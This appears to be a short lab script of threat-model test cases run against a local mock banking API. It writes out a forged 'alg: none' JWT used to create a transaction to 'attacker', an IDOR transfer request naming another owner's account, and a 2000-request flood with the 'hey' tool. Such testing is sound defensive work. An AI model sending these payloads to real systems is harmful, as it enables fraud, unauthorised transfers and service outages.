# 1. Start your local mock architecture in your lab
docker compose up -d

# 2. Run Test Case TH-01: Spoofing (Forged JWT with alg: none)
curl -i -X POST http://localhost:8080/v1/transactions \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInRlbmFudF9pZCI6IjAwMSJ9." \
  -H "Content-Type: application/json" \
  -d '{"amount": 1000, "recipient": "attacker"}'

# 3. Run Test Case TH-06: Elevation of Privilege (BOLA / IDOR manipulation)
curl -i -X POST http://localhost:8080/v1/transactions/transfer \
  -H "Authorization: Bearer <LEGIT_USER_101_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"source_account_owner_id": "999", "amount": 500.00}'

# 4. Run Test Case TH-05: Denial of Service / Connection Flooding
hey -n 2000 -c 50 http://localhost:8080/v1/accounts/search?query=recursive
